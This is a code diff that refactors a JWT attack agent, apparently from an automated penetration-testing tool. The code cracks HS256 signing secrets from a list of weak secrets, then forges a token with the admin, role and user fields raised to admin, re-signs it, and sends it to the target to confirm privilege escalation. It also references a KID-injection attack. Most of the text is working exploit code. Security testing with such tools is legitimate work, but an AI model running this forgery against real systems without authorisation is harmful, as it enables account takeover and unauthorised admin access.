@@ -408,58 +408,73 @@ class JWTAgent(BaseAgent):
         decoded = self._decode_token(token)
         if not decoded or decoded['header'].get('alg') != 'HS256':
             return
-            
+
         self.think("Starting dictionary attack on HS256 secret...")
-        
-        # Common weak secrets
-        wordlist = ["secret", "password", "123456", "jwt", "key", "auth", "admin", "token", "1234567890", "mysupersecret"]
-        
+
         parts = token.split('.')
+        signing_input, signature_actual = self._prepare_brute_force(parts)
+        if not signature_actual:
+            return
+
+        wordlist = ["secret", "password", "123456", "jwt", "key", "auth", "admin", "token", "1234567890", "mysupersecret"]
+
+        for secret in wordlist:
+            if self._test_secret(signing_input, signature_actual, secret):
+                await self._exploit_cracked_secret(secret, decoded, parts, token, url, location)
+                return
+
+    def _prepare_brute_force(self, parts: List[str]) -> Tuple[bytes, Optional[bytes]]:
+        """Prepare signing input and signature for brute force."""
         signing_input = f"{parts[0]}.{parts[1]}".encode()
         try:
             signature_actual = base64.urlsafe_b64decode(parts[2] + "==")
+            return signing_input, signature_actual
         except (ValueError, TypeError):
-            return
+            return signing_input, None
 
-        for secret in wordlist:
-            # Calculate HMAC
-            h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
-            if h.digest() == signature_actual:
-                self.think(f"🔥 CRITICAL: Found weak JWT secret: '{secret}'")
-                
-                # Immediate Exploitation: Forge Admin Token
-                new_payload = decoded['payload'].copy()
-                new_payload['admin'] = True
-                new_payload['role'] = 'admin'
-                
-                # Check for checks
-                if 'user' in new_payload: new_payload['user'] = 'admin'
-                
-                p_json = json.dumps(new_payload, separators=(',', ':')).encode()
-                p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
-                
-                new_signing_input = f"{parts[0]}.{p_b64}".encode()
-                new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
-                new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')
-                
-                forged_token = f"{parts[0]}.{p_b64}.{new_sig_b64}"
-                
-                self.findings.append({
-                    "type": "Weak JWT Secret",
-                    "url": url,
-                    "parameter": "header",
-                    "payload": secret,
-                    "evidence": f"Secret cracked: {secret}. Forged admin token created.",
-                    "severity": "CRITICAL",
-                    "validated": True,
-                    "status": "VALIDATED_CONFIRMED",
-                    "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
-                    "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)"
-                })
-                
-                if await self._verify_token_works(forged_token, url, location):
-                    self.think("SUCCESS: Admin privilege escalation confirmed!")
-                return
+    def _test_secret(self, signing_input: bytes, signature_actual: bytes, secret: str) -> bool:
+        """Test if secret matches signature."""
+        h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
+        return h.digest() == signature_actual
+
+    async def _exploit_cracked_secret(self, secret: str, decoded: Dict, parts: List[str], token: str, url: str, location: str):
+        """Exploit cracked JWT secret by forging admin token."""
+        self.think(f"🔥 CRITICAL: Found weak JWT secret: '{secret}'")
+
+        forged_token = self._forge_admin_token(decoded, parts, secret)
+
+        self.findings.append({
+            "type": "Weak JWT Secret",
+            "url": url,
+            "parameter": "header",
+            "payload": secret,
+            "evidence": f"Secret cracked: {secret}. Forged admin token created.",
+            "severity": "CRITICAL",
+            "validated": True,
+            "status": "VALIDATED_CONFIRMED",
+            "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
+            "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)"
+        })
+
+        if await self._verify_token_works(forged_token, url, location):
+            self.think("SUCCESS: Admin privilege escalation confirmed!")
+
+    def _forge_admin_token(self, decoded: Dict, parts: List[str], secret: str) -> str:
+        """Forge admin JWT token with cracked secret."""
+        new_payload = decoded['payload'].copy()
+        new_payload['admin'] = True
+        new_payload['role'] = 'admin'
+        if 'user' in new_payload:
+            new_payload['user'] = 'admin'
+
+        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
+        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
+
+        new_signing_input = f"{parts[0]}.{p_b64}".encode()
+        new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
+        new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')
+
+        return f"{parts[0]}.{p_b64}.{new_sig_b64}"
 
     async def _attack_kid_injection(self, token: str, url: str, location: str):
         """KID Injection for Directory Traversal / SQLi."""
